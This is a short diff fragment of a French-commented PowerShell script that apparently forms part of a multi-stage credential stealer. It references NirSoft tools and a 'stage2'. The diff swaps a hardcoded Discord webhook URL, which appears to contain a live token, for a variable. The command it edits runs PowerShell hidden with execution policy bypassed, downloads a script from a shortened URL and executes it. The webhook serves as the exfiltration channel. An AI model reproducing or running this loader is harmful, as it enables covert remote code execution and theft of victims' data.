@@ -47,7 +47,7 @@ Get-Nirsoft
 Start-Sleep -Seconds 15
 
 #Invoquer avec cette commande fonctionne normalement, à voir si $DiscordUrl arrive à suivre : 
-powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy'; irm https://rb.gy/vk584t | iex}"
+powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value '$DiscordUrl'; irm https://rb.gy/vk584t | iex}"
 
 # Invoquer stage2 avec la variable $DiscordUrl
 Invoke-Expression @"
